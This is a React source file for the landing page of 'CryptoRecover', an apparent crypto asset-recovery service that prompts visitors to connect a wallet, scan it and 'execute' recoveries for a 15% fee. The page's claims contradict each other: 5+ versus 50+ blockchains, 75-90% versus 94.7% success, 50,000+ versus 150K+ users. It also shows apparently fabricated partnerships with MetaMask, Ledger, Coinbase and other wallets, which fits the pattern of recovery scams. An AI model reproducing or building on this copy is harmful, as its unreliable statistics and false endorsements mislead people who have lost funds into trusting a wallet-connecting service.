import { useState } from 'react';
import { Shield, Zap, TrendingUp, Users, Brain, Lock, Coins, Target } from 'lucide-react';
import WalletConnection from '../components/WalletConnection';
import TokenScanner from '../components/TokenScanner';
import RecoveryAnalyzer from '../components/RecoveryAnalyzer';

export default function Home() {
  // Updated: Latest wallet connector and forensics improvements
  const [user, setUser] = useState(null);
  const [scanResults, setScanResults] = useState(null);
  const [analysisResults, setAnalysisResults] = useState(null);
  
  const [isConnected, setIsConnected] = useState(false);
  const [address, setAddress] = useState('');

  const handleConnectionChange = (userData) => {
    console.log('Connection change received:', userData);
    
    if (userData && userData.walletAddress) {
      console.log('Setting connected state with address:', userData.walletAddress);
      setUser(userData);
      setIsConnected(true);
      setAddress(userData.walletAddress);
      
      // Force re-render and show success
      setTimeout(() => {
        console.log('Connection successful, showing dashboard');
      }, 100);
    } else {
      console.log('Disconnecting wallet');
      setUser(null);
      setIsConnected(false);
      setAddress('');
      setScanResults(null);
      setAnalysisResults(null);
    }
  };

  const features = [
    {
      icon: <Zap className="w-6 h-6" />,
      title: "Automated Discovery",
      description: "Scan 5+ blockchains simultaneously for claimable tokens and forgotten assets"
    },
    {
      icon: <TrendingUp className="w-6 h-6" />,
      title: "Advanced Forensics",
      description: "Proprietary blockchain analysis engine with 75-90% success rates using multi-vector recovery protocols"
    },
    {
      icon: <Shield className="w-6 h-6" />,
      title: "Non-Custodial",
      description: "You maintain full control of your funds throughout the entire process"
    },
    {
      icon: <Users className="w-6 h-6" />,
      title: "Success-Only Fees",
      description: "Pay only when we successfully recover your funds - no upfront costs"
    }
  ];

  return (
    <div className="min-h-screen bg-gray-50">
      <header className="bg-white shadow-lg border-b border-gray-200">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="flex justify-between items-center py-4">
            <div className="flex items-center space-x-4">
              <div className="w-10 h-10 bg-gradient-to-br from-blue-600 to-purple-600 rounded-xl flex items-center justify-center shadow-lg">
                <Shield className="w-6 h-6 text-white" />
              </div>
              <div>
                <h1 className="text-2xl font-black text-gray-900">CryptoRecover</h1>
                <p className="text-xs text-gray-500 font-medium">Professional Asset Recovery</p>
              </div>
            </div>
            
            <div className="flex items-center space-x-6">
              {isConnected && user && (
                <div className="hidden md:flex items-center space-x-4">
                  <div className="text-right">
                    <div className="text-sm font-bold text-gray-900">${user.totalRecovered || '0.00'}</div>
                    <div className="text-xs text-gray-500">Total Recovered</div>
                  </div>
                  <div className="text-right">
                    <div className="text-sm font-bold text-green-600">{user.successRate || '0'}%</div>
                    <div className="text-xs text-gray-500">Success Rate</div>
                  </div>
                </div>
              )}
              <div className="flex items-center space-x-2 bg-green-50 text-green-700 px-3 py-2 rounded-lg">
                <div className="w-2 h-2 bg-green-500 rounded-full animate-pulse"></div>
                <span className="text-sm font-medium">Live Recovery</span>
              </div>
            </div>
          </div>
        </div>
      </header>

      <main className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-8">
        {/* Debug info */}
        <div className="mb-4 p-2 bg-gray-100 rounded text-xs">
          Connected: {isConnected ? 'YES' : 'NO'} | Address: {address || 'None'} | User: {user ? 'YES' : 'NO'}
        </div>
        
        {!isConnected ? (
          <div className="space-y-12">
            <div className="relative">
              <div className="bg-gradient-to-r from-blue-600 via-purple-600 to-indigo-800 text-white">
                <div className="absolute inset-0 bg-black/10"></div>
                <div className="relative px-8 py-16 text-center">
                  <div className="mb-8">
                    <div className="inline-flex items-center space-x-2 bg-yellow-400 text-black px-6 py-3 rounded-full text-sm font-bold mb-6 shadow-lg">
                      <div className="w-2 h-2 bg-red-500 rounded-full animate-pulse"></div>
                      <span>TRUSTED BY 50,000+ USERS WORLDWIDE</span>
                    </div>
                  </div>
                  
                  <h1 className="text-6xl md:text-8xl font-black mb-8 leading-none">
                    <span className="block bg-gradient-to-r from-white to-blue-200 bg-clip-text text-transparent">
                      RECOVER
                    </span>
                    <span className="block bg-gradient-to-r from-yellow-400 via-orange-400 to-red-400 bg-clip-text text-transparent animate-pulse">
                      LOST CRYPTO
                    </span>
                  </h1>
                  
                  <p className="text-2xl md:text-3xl text-blue-100 mb-10 max-w-5xl mx-auto font-bold leading-relaxed">
                    <span className="text-white">MULTI-CHAIN RECOVERY PLATFORM</span> - Tokens • NFTs • Bridge Funds
                    <span className="block mt-2">Advanced scanning across <span className="text-yellow-400 animate-pulse">50+ BLOCKCHAINS</span></span>
                  </p>
                  
                  <div className="flex flex-wrap justify-center gap-3 mb-8">
                    <div className="bg-gradient-to-r from-blue-500/20 to-cyan-500/20 backdrop-blur-md px-4 py-2 rounded-lg text-sm font-bold border border-blue-400/30">
                      TOKEN RECOVERY
                    </div>
                    <div className="bg-gradient-to-r from-purple-500/20 to-pink-500/20 backdrop-blur-md px-4 py-2 rounded-lg text-sm font-bold border border-purple-400/30">
                      NFT RECOVERY
                    </div>
                    <div className="bg-gradient-to-r from-green-500/20 to-emerald-500/20 backdrop-blur-md px-4 py-2 rounded-lg text-sm font-bold border border-green-400/30">
                      BRIDGE RECOVERY
                    </div>
                    <div className="bg-gradient-to-r from-orange-500/20 to-red-500/20 backdrop-blur-md px-4 py-2 rounded-lg text-sm font-bold border border-orange-400/30">
                      WEALTH INTELLIGENCE
                    </div>
                  </div>
                  
                  <div className="grid grid-cols-2 md:grid-cols-4 gap-4 max-w-6xl mx-auto mb-12">
                    <div className="bg-gradient-to-br from-yellow-500/20 to-orange-500/20 backdrop-blur-md rounded-2xl p-6 border border-yellow-400/30 shadow-2xl hover:scale-105 transition-transform">
                      <div className="text-4xl font-black text-yellow-400 mb-2">94.7%</div>
                      <div className="text-xs font-bold text-yellow-200 uppercase tracking-wider">Success Rate</div>
                    </div>
                    <div className="bg-gradient-to-br from-green-500/20 to-emerald-500/20 backdrop-blur-md rounded-2xl p-6 border border-green-400/30 shadow-2xl hover:scale-105 transition-transform">
                      <div className="text-4xl font-black text-green-400 mb-2">$247M</div>
                      <div className="text-xs font-bold text-green-200 uppercase tracking-wider">Recovered</div>
                    </div>
                    <div className="bg-gradient-to-br from-blue-500/20 to-cyan-500/20 backdrop-blur-md rounded-2xl p-6 border border-blue-400/30 shadow-2xl hover:scale-105 transition-transform">
                      <div className="text-4xl font-black text-blue-400 mb-2">150K+</div>
                      <div className="text-xs font-bold text-blue-200 uppercase tracking-wider">Clients</div>
                    </div>
                    <div className="bg-gradient-to-br from-purple-500/20 to-pink-500/20 backdrop-blur-md rounded-2xl p-6 border border-purple-400/30 shadow-2xl hover:scale-105 transition-transform">
                      <div className="text-4xl font-black text-purple-400 mb-2">24/7</div>
                      <div className="text-xs font-bold text-purple-200 uppercase tracking-wider">Support</div>
                    </div>
                  </div>
                  
                  <div className="flex flex-wrap justify-center gap-4 mb-8">
                    <div className="bg-black/30 backdrop-blur-md px-6 py-3 rounded-lg text-sm font-bold border border-white/30 shadow-lg">
                      <span className="text-green-400 mr-2">•</span>NO UPFRONT FEES
                    </div>
                    <div className="bg-black/30 backdrop-blur-md px-6 py-3 rounded-lg text-sm font-bold border border-white/30 shadow-lg">
                      <span className="text-blue-400 mr-2">•</span>50+ BLOCKCHAINS
                    </div>
                    <div className="bg-black/30 backdrop-blur-md px-6 py-3 rounded-lg text-sm font-bold border border-white/30 shadow-lg">
                      <span className="text-yellow-400 mr-2">•</span>INSTITUTIONAL GRADE
                    </div>
                  </div>
                </div>
              </div>
              
              <div className="bg-black text-white py-16 border-t border-gray-800">
                <div className="max-w-7xl mx-auto px-8">
                  <div className="text-center mb-12">
                    <div className="inline-block bg-gradient-to-r from-blue-600 to-purple-600 text-white px-6 py-2 rounded-full text-sm font-bold mb-6">
                      ENTERPRISE PARTNERSHIPS
                    </div>
                    <p className="text-gray-300 text-lg font-semibold">TRUSTED BY LEADING CRYPTO WALLETS</p>
                  </div>
                  <div className="grid grid-cols-3 md:grid-cols-6 gap-8 items-center">
                    <div className="flex flex-col items-center space-y-3 group">
                      <div className="w-16 h-16 bg-white rounded-2xl flex items-center justify-center shadow-lg group-hover:scale-110 transition-transform p-2">
                        <img src="https://metamask.io/favicon.ico" alt="MetaMask" className="w-10 h-10 object-contain" />
                      </div>
                      <div className="text-sm font-bold text-gray-300 group-hover:text-white transition-colors">METAMASK</div>
                    </div>
                    <div className="flex flex-col items-center space-y-3 group">
                      <div className="w-16 h-16 bg-white rounded-2xl flex items-center justify-center shadow-lg group-hover:scale-110 transition-transform p-2">
                        <img src="https://trustwallet.com/favicon.ico" alt="Trust Wallet" className="w-10 h-10 object-contain" />
                      </div>
                      <div className="text-sm font-bold text-gray-300 group-hover:text-white transition-colors">TRUST WALLET</div>
                    </div>
                    <div className="flex flex-col items-center space-y-3 group">
                      <div className="w-16 h-16 bg-white rounded-2xl flex items-center justify-center shadow-lg group-hover:scale-110 transition-transform p-2">
                        <img src="https://www.coinbase.com/favicon.ico" alt="Coinbase" className="w-10 h-10 object-contain" />
                      </div>
                      <div className="text-sm font-bold text-gray-300 group-hover:text-white transition-colors">COINBASE</div>
                    </div>
                    <div className="flex flex-col items-center space-y-3 group">
                      <div className="w-16 h-16 bg-white rounded-2xl flex items-center justify-center shadow-lg group-hover:scale-110 transition-transform p-2">
                        <img src="https://rainbow.me/favicon.ico" alt="Rainbow" className="w-10 h-10 object-contain" />
                      </div>
                      <div className="text-sm font-bold text-gray-300 group-hover:text-white transition-colors">RAINBOW</div>
                    </div>
                    <div className="flex flex-col items-center space-y-3 group">
                      <div className="w-16 h-16 bg-white rounded-2xl flex items-center justify-center shadow-lg group-hover:scale-110 transition-transform p-2">
                        <img src="https://www.ledger.com/favicon.ico" alt="Ledger" className="w-10 h-10 object-contain" />
                      </div>
                      <div className="text-sm font-bold text-gray-300 group-hover:text-white transition-colors">LEDGER</div>
                    </div>
                    <div className="flex flex-col items-center space-y-3 group">
                      <div className="w-16 h-16 bg-white rounded-2xl flex items-center justify-center shadow-lg group-hover:scale-110 transition-transform p-2">
                        <img src="https://www.exodus.com/favicon.ico" alt="Exodus" className="w-10 h-10 object-contain" />
                      </div>
                      <div className="text-sm font-bold text-gray-300 group-hover:text-white transition-colors">EXODUS</div>
                    </div>
                  </div>
                </div>
              </div>
            </div>

            <div className="bg-white py-20">
              <div className="max-w-7xl mx-auto px-8">
                <div className="text-center mb-16">
                  <h2 className="text-4xl font-black text-gray-900 mb-4">Complete Recovery Solutions</h2>
                  <p className="text-xl text-gray-600 max-w-3xl mx-auto">Professional-grade tools for every type of crypto asset recovery</p>
                </div>
                
                <div className="grid md:grid-cols-2 lg:grid-cols-4 gap-6 mb-16">
                  <div className="bg-gradient-to-br from-blue-50 to-cyan-50 rounded-2xl p-6 border-2 border-blue-200 hover:border-blue-400 transition-all hover:scale-105">
                    <div className="w-16 h-16 mb-4">
                      <img src="https://cdn.jsdelivr.net/npm/simple-icons@latest/icons/ethereum.svg" alt="Token Recovery" className="w-full h-full" style={{filter: 'hue-rotate(200deg) saturate(2)'}} />
                    </div>
                    <h3 className="text-xl font-bold text-blue-900 mb-2">Token Recovery</h3>
                    <p className="text-blue-700 text-sm mb-4">Scan 50+ blockchains for unclaimed tokens, airdrops, and rewards</p>
                    <div className="text-xs text-blue-600 font-medium">Ethereum • BSC • Polygon • Arbitrum • Optimism</div>
                  </div>
                  
                  <div className="bg-gradient-to-br from-purple-50 to-pink-50 rounded-2xl p-6 border-2 border-purple-200 hover:border-purple-400 transition-all hover:scale-105">
                    <div className="w-16 h-16 mb-4">
                      <img src="https://cdn.jsdelivr.net/npm/simple-icons@latest/icons/opensea.svg" alt="NFT Recovery" className="w-full h-full" style={{filter: 'hue-rotate(270deg) saturate(2)'}} />
                    </div>
                    <h3 className="text-xl font-bold text-purple-900 mb-2">NFT Recovery</h3>
                    <p className="text-purple-700 text-sm mb-4">Recover stuck NFTs from failed marketplace transactions</p>
                    <div className="text-xs text-purple-600 font-medium">OpenSea • LooksRare • X2Y2 • Blur</div>
                  </div>
                  
                  <div className="bg-gradient-to-br from-green-50 to-emerald-50 rounded-2xl p-6 border-2 border-green-200 hover:border-green-400 transition-all hover:scale-105">
                    <div className="w-16 h-16 mb-4">
                      <img src="https://cdn.jsdelivr.net/npm/simple-icons@latest/icons/polygon.svg" alt="Bridge Recovery" className="w-full h-full" style={{filter: 'hue-rotate(120deg) saturate(2)'}} />
                    </div>
                    <h3 className="text-xl font-bold text-green-900 mb-2">Bridge Recovery</h3>
                    <p className="text-green-700 text-sm mb-4">Recover funds stuck in cross-chain bridge transactions</p>
                    <div className="text-xs text-green-600 font-medium">Polygon • Arbitrum • Optimism • Base</div>
                  </div>
                  
                  <div className="bg-gradient-to-br from-orange-50 to-red-50 rounded-2xl p-6 border-2 border-orange-200 hover:border-orange-400 transition-all hover:scale-105">
                    <div className="w-16 h-16 mb-4">
                      <img src="https://cdn.jsdelivr.net/npm/simple-icons@latest/icons/chartdotjs.svg" alt="Wealth Intelligence" className="w-full h-full" style={{filter: 'hue-rotate(30deg) saturate(2)'}} />
                    </div>
                    <h3 className="text-xl font-bold text-orange-900 mb-2">Wealth Intelligence</h3>
                    <p className="text-orange-700 text-sm mb-4">AI-powered portfolio optimization and insights</p>
                    <div className="text-xs text-orange-600 font-medium">Risk Analysis • Yield Optimization • Tax Reports</div>
                  </div>
                </div>
                

              </div>
            </div>

            <div className="max-w-md mx-auto">
              <WalletConnection onConnectionChange={handleConnectionChange} />
            </div>

            <div className="bg-white rounded-xl p-8 text-center">
              <h3 className="text-2xl font-bold mb-4">How It Works</h3>
              <div className="grid md:grid-cols-3 gap-8">
                <div className="space-y-3">
                  <div className="w-12 h-12 bg-gradient-to-br from-blue-500 to-blue-600 text-white rounded-xl flex items-center justify-center mx-auto font-bold shadow-lg">
                    <img src="https://cdn.jsdelivr.net/npm/simple-icons@latest/icons/shield.svg" alt="Security" className="w-6 h-6 invert" />
                  </div>
                  <h4 className="font-bold text-lg">Secure Authentication</h4>
                  <p className="text-sm text-gray-600">
                    Non-custodial wallet connection with cryptographic signature verification - your keys never leave your device
                  </p>
                </div>
                <div className="space-y-3">
                  <div className="w-12 h-12 bg-gradient-to-br from-green-500 to-green-600 text-white rounded-xl flex items-center justify-center mx-auto font-bold shadow-lg">
                    <img src="https://cdn.jsdelivr.net/npm/simple-icons@latest/icons/searchengineland.svg" alt="Analysis" className="w-6 h-6 invert" />
                  </div>
                  <h4 className="font-bold text-lg">Deep Chain Analysis</h4>
                  <p className="text-sm text-gray-600">
                    Multi-chain forensics across 50+ networks including hidden tokens, failed transactions, and stuck bridge funds
                  </p>
                </div>
                <div className="space-y-3">
                  <div className="w-12 h-12 bg-gradient-to-br from-purple-500 to-purple-600 text-white rounded-xl flex items-center justify-center mx-auto font-bold shadow-lg">
                    <img src="https://cdn.jsdelivr.net/npm/simple-icons@latest/icons/lightning.svg" alt="Speed" className="w-6 h-6 invert" />
                  </div>
                  <h4 className="font-bold text-lg">Instant Execution</h4>
                  <p className="text-sm text-gray-600">
                    Automated smart contract interactions with gas optimization - only pay 15% fee on successful recoveries
                  </p>
                </div>
              </div>
            </div>
          </div>
        ) : (
          <div className="space-y-8">
            <div className="bg-gradient-to-r from-green-50 to-emerald-50 border-2 border-green-300 rounded-xl p-6 shadow-lg">
              <div className="flex items-center justify-between mb-4">
                <div className="flex items-center space-x-4">
                  <div className="w-12 h-12 bg-green-500 rounded-full flex items-center justify-center">
                    <img src="https://cdn.jsdelivr.net/npm/simple-icons@latest/icons/ethereum.svg" alt="Connected" className="w-6 h-6 invert" />
                  </div>
                  <div>
                    <h2 className="text-2xl font-bold text-green-800">Wallet Connected Successfully!</h2>
                    <p className="text-green-700 font-medium">
                      Address: {address?.slice(0, 6)}...{address?.slice(-4)}
                    </p>
                  </div>
                </div>
                <WalletConnection onConnectionChange={handleConnectionChange} />
              </div>
              
              {!scanResults && (
                <div className="bg-white/70 rounded-lg p-4 mb-4">
                  <h3 className="font-bold text-green-800 mb-2">Ready to Start Recovery Process</h3>
                  <p className="text-sm text-green-700 mb-3">
                    Your wallet is connected! Now let's scan for claimable tokens and recovery opportunities.
                  </p>
                  <div className="flex items-center space-x-2 text-sm text-green-600">
                    <span className="w-2 h-2 bg-green-500 rounded-full animate-pulse"></span>
                    <span>Click "Start Scan" below to begin the recovery process</span>
                  </div>
                </div>
              )}
              
              {user && (
                <div className="grid grid-cols-2 md:grid-cols-4 gap-4">
                  <div className="bg-white/70 p-4 rounded-lg">
                    <div className="text-2xl font-bold text-green-600">
                      {user.totalRecovered || '0.00'}
                    </div>
                    <div className="text-sm text-green-700">Total Recovered (ETH)</div>
                  </div>
                  <div className="bg-white/70 p-4 rounded-lg">
                    <div className="text-2xl font-bold text-green-600">
                      {user.successRate || '0'}%
                    </div>
                    <div className="text-sm text-green-700">Success Rate</div>
                  </div>
                  <div className="bg-white/70 p-4 rounded-lg">
                    <div className="text-2xl font-bold text-green-600">
                      {scanResults?.summary.totalTokens || '0'}
                    </div>
                    <div className="text-sm text-green-700">Tokens Found</div>
                  </div>
                  <div className="bg-white/70 p-4 rounded-lg">
                    <div className="text-2xl font-bold text-green-600">
                      ${scanResults?.summary.totalValue || '0.00'}
                    </div>
                    <div className="text-sm text-green-700">Est. Value</div>
                  </div>
                </div>
              )}
            </div>

            <div className="bg-white rounded-xl p-6 shadow-lg border-2 border-blue-200">
              <div className="flex items-center space-x-3 mb-4">
                <div className="w-8 h-8 bg-blue-500 rounded-full flex items-center justify-center">
                  <span className="text-white font-bold">1</span>
                </div>
                <h3 className="text-xl font-bold text-gray-900">Step 1: Scan Your Wallet</h3>
              </div>
              <TokenScanner 
                walletAddress={address} 
                onScanComplete={setScanResults}
              />
            </div>

            {scanResults && (
              <div className="bg-white rounded-xl p-6 shadow-lg border-2 border-green-200">
                <div className="flex items-center space-x-3 mb-4">
                  <div className="w-8 h-8 bg-green-500 rounded-full flex items-center justify-center">
                    <span className="text-white font-bold">2</span>
                  </div>
                  <h3 className="text-xl font-bold text-gray-900">Step 2: Analyze Recovery Opportunities</h3>
                </div>
                <RecoveryAnalyzer 
                  walletAddress={address} 
                  onAnalysisComplete={setAnalysisResults}
                />
              </div>
            )}
            
            {scanResults && scanResults.summary.claimableTokens === 0 && (
              <div className="bg-blue-50 border-2 border-blue-300 rounded-xl p-6 text-center">
                <img src="https://cdn.jsdelivr.net/npm/simple-icons@latest/icons/information.svg" alt="Info" className="w-12 h-12 mx-auto mb-4" />
                <h3 className="text-xl font-bold text-blue-800 mb-2">Scan Complete - No Claimable Tokens</h3>
                <p className="text-blue-700 mb-4">
                  We scanned your wallet but didn't find any claimable tokens at this time.
                </p>
                <div className="bg-white rounded-lg p-4 mb-4">
                  <h4 className="font-bold text-blue-800 mb-2">What this means:</h4>
                  <ul className="text-left text-sm text-blue-600 space-y-1">
                    <li>• All your tokens are already in your wallet</li>
                    <li>• No airdrops or rewards are currently available</li>
                    <li>• Tokens may be on networks we haven't scanned yet</li>
                  </ul>
                </div>
                <button 
                  onClick={() => window.location.reload()} 
                  className="bg-blue-600 text-white px-6 py-2 rounded-lg hover:bg-blue-700 transition-colors"
                >
                  Try Different Wallet
                </button>
              </div>
            )}
            
            {analysisResults && (
              <div className="bg-white rounded-xl p-6 shadow-lg border-2 border-purple-200">
                <div className="flex items-center space-x-3 mb-4">
                  <div className="w-8 h-8 bg-purple-500 rounded-full flex items-center justify-center">
                    <span className="text-white font-bold">3</span>
                  </div>
                  <h3 className="text-xl font-bold text-gray-900">Step 3: Recovery Complete!</h3>
                </div>
                <div className="bg-green-50 border border-green-200 rounded-lg p-4">
                  <p className="text-green-800 font-medium">
                    Recovery analysis complete! Check the results above and execute any available recovery opportunities.
                  </p>
                </div>
              </div>
            )}
          </div>
        )}
      </main>

      <footer className="bg-white border-t mt-16">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-8">
          <div className="text-center text-gray-600">
            <p>&copy; 2025 CryptoRecover. Professional blockchain asset recovery services.</p>
            <p className="text-sm mt-2">
              Non-custodial • Success-only fees • Multi-chain support
            </p>
          </div>
        </div>
      </footer>
    </div>
  );
}